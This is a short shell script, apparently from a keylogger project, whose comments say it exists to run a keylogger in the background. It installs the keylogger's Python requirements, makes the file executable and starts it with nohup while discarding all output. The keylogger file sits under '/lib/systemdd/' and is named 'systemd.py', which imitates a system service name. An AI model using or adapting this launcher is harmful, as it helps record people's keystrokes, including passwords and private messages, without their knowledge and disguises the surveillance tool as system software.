##This start script is a free software
##Developed by Joshia Rheinier
##The purpose of this script is to run the keylogger on background


#Put your keylogger script along with its full directory here
DIR="/lib/systemdd/KL/"
FILE="systemd.py"
REQ="requirements.txt"

#Make the program be able to be executed
chmod +x $DIR$FILE
#Execute the program with Python 3, and
#put the process in background with
#nohup command
pip3 install -r $DIR$REQ
nohup python3 $DIR$FILE &> no-output&
